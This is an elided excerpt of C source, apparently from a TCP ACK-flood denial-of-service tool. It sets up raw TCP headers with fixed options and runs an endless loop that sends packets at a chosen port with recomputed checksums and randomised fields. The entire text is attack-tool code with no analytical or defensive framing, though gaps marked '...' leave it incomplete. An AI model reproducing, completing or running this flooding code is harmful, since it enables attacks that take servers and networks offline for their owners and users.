...
void setup_tcp_header(struct tcphdr *tcph)
{
	...
	tcph->check = 0;
	memcpy((void*) tcph + sizeof(struct tcphdr), "\x01\x01\x05\x0a\x7e\xb0\x53\x46\x7e\xb0\x53\x47", 12);	// tcp options
	tcph->ack = 1;
...
void *flood(void *par1)
{
	...
	while (1)
	{
		...
		tcph->dest = htons(floodport);
		tcph->check = tcpcsum(iph, tcph, 12);
		...
		stronka[4] = randnum(1, 100);
		stronka[5] = randnum(1, 100);
		stronka[6] = randnum(1, 100);
		stronka[7] = randnum(1, 100);
		stronka[8] = randnum(1, 100);
		stronka[9] = rand_cmwc() % stronka[5];
		stronka[10] = rand_cmwc() % stronka[6];
		stronka[11] = rand_cmwc() % stronka[7];
		stronka[12] = rand_cmwc() % stronka[8];
